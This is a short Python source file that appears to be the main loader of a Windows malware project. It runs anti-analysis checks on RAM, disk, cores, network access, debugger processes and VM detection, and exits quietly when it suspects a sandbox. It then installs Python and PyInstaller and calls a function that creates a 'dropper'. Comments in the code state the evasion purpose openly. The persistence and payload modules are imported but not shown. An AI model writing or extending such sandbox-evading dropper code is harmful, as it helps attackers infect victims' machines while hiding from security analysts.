import sys

from Persistance.foothold import get_pyinstaller,install_python,create_dropper
from Utils.helpers import is_python_exist,is_online,find_python_path,is_admin
from sys import exit as sys_exit
from os.path import join as path_join
from Evasion import specCheck,hide

def main():
    if any([not specCheck.is_enough_ram(),not specCheck.is_enough_disk(), not specCheck.is_enough_cores()]):
        sys_exit(0) #Stop exec if we suspect that's vm/sandbox by resource check
    #//TODO: add doc
    if not is_online():
        sys_exit('NOT ONLINE') #another vm evade check
    if specCheck.find_debug_process():
        sys.exit(0) # stop exec if we have debug process somewhere
    if hide.detect_vm():
        sys.exit(0) #another vm evade
        #we do the detect_vm as last check as this is noisy AF



    if not is_python_exist():
        install_python()

    pythonPath = path_join(find_python_path(),'python.exe')
    if not is_admin():
        get_pyinstaller(pythonPath,admin=False)
    else:
        get_pyinstaller(pythonPath)
    create_dropper() #in the end, when we installed everything --> we create dropper


if __name__ == "__main__":
    main()